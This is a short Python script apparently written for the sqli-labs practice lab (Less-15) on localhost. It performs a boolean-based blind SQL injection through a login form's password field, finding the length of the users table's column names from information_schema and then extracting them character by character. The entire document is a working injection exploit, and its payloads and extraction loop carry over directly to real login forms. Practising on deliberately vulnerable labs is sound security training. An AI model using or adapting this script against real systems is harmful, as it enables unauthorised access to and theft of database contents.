import requests


url="http://localhost:8001"
lesson = "/Less-15/"

url = url + lesson
query = "(select group_concat(column_name) from information_schema.columns where table_name='users')"

k = 0
for i in range(100):
    q1 = "' or length(" + query + ") = " + str(i) + " --'"
    data = {'uname':'','passwd':q1}
    r = requests.post(url,data)
    if "flag.jpg" in r.text:
        print(i)
        k = i
        break

if k == 0:
    print("length of response is greater than 100, make change to program")
    exit()

returnval = ""
q2 = "' or binary substr(" + query + ","
for i in range(1,k + 1):
    for j in range(48,123):
        q3 = q2 + str(i) + ",1)='" + chr(j)
        data = {'uname':'','passwd':q3}
        r = requests.post(url,data)
        if "flag.jpg" in r.text:
            returnval += chr(j)
#            print(q3)
            break

print(returnval)